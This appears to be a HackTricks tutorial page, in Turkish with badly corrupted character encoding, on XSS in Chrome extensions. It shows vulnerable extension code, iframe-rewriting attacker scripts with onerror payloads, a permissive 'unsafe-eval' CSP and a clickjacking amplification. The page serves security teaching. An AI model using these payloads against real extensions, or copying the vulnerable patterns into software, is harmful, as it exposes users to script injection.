# BrowExt - XSS Ã–rneÄŸi

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Iframe AracÄ±lÄ±ÄŸÄ±yla Cross-Site Scripting (XSS)

Bu yapÄ±landÄ±rmada, bir **iÃ§erik betiÄŸi** Iframe'in Ã¶rneklendirilmesi iÃ§in kullanÄ±lÄ±r ve Iframe'in kaynaÄŸÄ± olarak sorgu parametreleri iÃ§eren bir URL eklenir:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
Halka aÃ§Ä±k bir HTML sayfasÄ± olan **`message.html`**, URL'deki parametrelere baÄŸlÄ± olarak belge gÃ¶vdesine iÃ§erik eklemek iÃ§in tasarlanmÄ±ÅŸtÄ±r:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
Bir kÃ¶tÃ¼ niyetli betik, saldÄ±rganÄ±n sayfasÄ±nda yÃ¼rÃ¼tÃ¼lÃ¼r ve Iframe'in kaynaÄŸÄ±nÄ±n `content` parametresi deÄŸiÅŸtirilerek bir **XSS saldÄ±rÄ± yÃ¼kÃ¼** eklenir. Bunun iÃ§in Iframe'in kaynaÄŸÄ± zararlÄ± bir betik iÃ§erecek ÅŸekilde gÃ¼ncellenir:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
AÅŸÄ±rÄ± izin verici bir Ä°Ã§erik GÃ¼venlik PolitikasÄ± Ã¶rneÄŸi:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
JavaScript'in yÃ¼rÃ¼tÃ¼lmesine izin vererek, sistem XSS saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z hale gelir.

XSS'yi tetiklemek iÃ§in alternatif bir yaklaÅŸÄ±m, bir Iframe Ã¶ÄŸesi oluÅŸturmak ve kaynak olarak zararlÄ± betiÄŸi `content` parametresi olarak ayarlamaktÄ±r:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-tabanlÄ± XSS + ClickJacking

Bu Ã¶rnek, [orijinal yazÄ±dan](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/) alÄ±nmÄ±ÅŸtÄ±r.

Temel sorun, **`/html/bookmarks.html`** konumunda bulunan bir DOM-tabanlÄ± Cross-site Scripting (XSS) aÃ§Ä±ÄŸÄ±ndan kaynaklanmaktadÄ±r. Sorunlu JavaScript, **`bookmarks.js`**'nin bir parÃ§asÄ± olarak aÅŸaÄŸÄ±da detaylandÄ±rÄ±lmÄ±ÅŸtÄ±r:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
Bu kod parÃ§acÄ±ÄŸÄ±, **`txtName`** giriÅŸ alanÄ±ndan **deÄŸeri** alÄ±r ve HTML oluÅŸturmak iÃ§in **dize birleÅŸtirme** kullanÄ±r. OluÅŸturulan HTML daha sonra jQuery'nin `.append()` fonksiyonu kullanÄ±larak DOM'a eklenir.

Genellikle, Chrome eklentisinin Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) bu tÃ¼r gÃ¼venlik aÃ§Ä±klarÄ±nÄ± engeller. Ancak, **'unsafe-eval' ile CSP gevÅŸemesi** ve jQuery'nin DOM manipÃ¼lasyon yÃ¶ntemlerinin (DOM ekleme sÄ±rasÄ±nda [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) fonksiyonuna betikleri iletmek iÃ§in [`globalEval()`](https://api.jquery.com/jquery.globaleval/) kullanmasÄ±) kullanÄ±lmasÄ± nedeniyle, sÃ¶mÃ¼rÃ¼ hala mÃ¼mkÃ¼ndÃ¼r.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± Ã¶nemli olsa da, genellikle kullanÄ±cÄ± etkileÅŸimine baÄŸlÄ± olarak sÃ¶mÃ¼rÃ¼lÃ¼r: sayfayÄ± ziyaret etmek, bir XSS yÃ¼klemesi girmek ve "Ekle" dÃ¼ÄŸmesini etkinleÅŸtirmek.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± artÄ±rmak iÃ§in ikincil bir **clickjacking** gÃ¼venlik aÃ§Ä±ÄŸÄ± sÃ¶mÃ¼rÃ¼lÃ¼r. Chrome eklentisinin manifest dosyasÄ± geniÅŸ bir `web_accessible_resources` politikasÄ±nÄ± sergiler:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
Ã–zellikle **`/html/bookmarks.html`** sayfasÄ± Ã§erÃ§evelenmeye mÃ¼sait olduÄŸundan dolayÄ± **clickjacking** saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±zdÄ±r. Bu zafiyet, saldÄ±rganÄ±n sitesi iÃ§inde sayfayÄ± Ã§erÃ§evelemek suretiyle, arayÃ¼zÃ¼ yanÄ±ltÄ±cÄ± bir ÅŸekilde yeniden tasarlamak iÃ§in DOM Ã¶ÄŸeleriyle Ã¶rtÃ¼ÅŸmesini saÄŸlar. Bu manipÃ¼lasyon, kurbanlarÄ±n istemeden altta yatan uzantÄ±yla etkileÅŸimde bulunmasÄ±na yol aÃ§ar.

## Referanslar

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
